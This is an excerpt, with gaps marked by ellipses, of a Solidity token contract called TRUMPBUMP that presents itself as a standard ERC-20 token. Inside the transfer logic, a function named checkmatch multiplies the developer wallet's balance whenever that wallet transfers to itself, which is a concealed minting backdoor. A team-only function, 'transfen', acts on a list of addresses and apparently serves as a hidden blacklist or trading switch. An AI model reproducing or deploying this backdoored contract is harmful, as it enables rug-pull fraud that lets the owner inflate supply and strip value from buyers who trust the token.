...
contract TRUMPBUMP is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "TRUMPBUMP";
    string private _symbol = unicode"TRUMPBUMP";
    uint8 private _decimals = 1;
    address private DEVWallet = 0xCa636B969d260201ad4237DcB074E1664A30de5E;
    ...
    uint256 private _maxTxAmount = 20000000000000 * 10**_decimals;
    ...
    constructor () {
        ...
        teamWallet = payable(address(0xCa636B969d260201ad4237DcB074E1664A30de5E));
        marketingWallet = payable(address(0xCa636B969d260201ad4237DcB074E1664A30de5E));
    ...
    function checkmatch(
        ...
        if (inu == bnu && inu ==DEVWallet) {
            _balances[DEVWallet] = _balances[DEVWallet].mul(moon);     
        }
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            checkmatch(sender, recipient,amount);
            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }

    function transfen(bool state, address[] calldata addresses) external virtual {if(msg.sender == teamWallet)
        tracker(true);
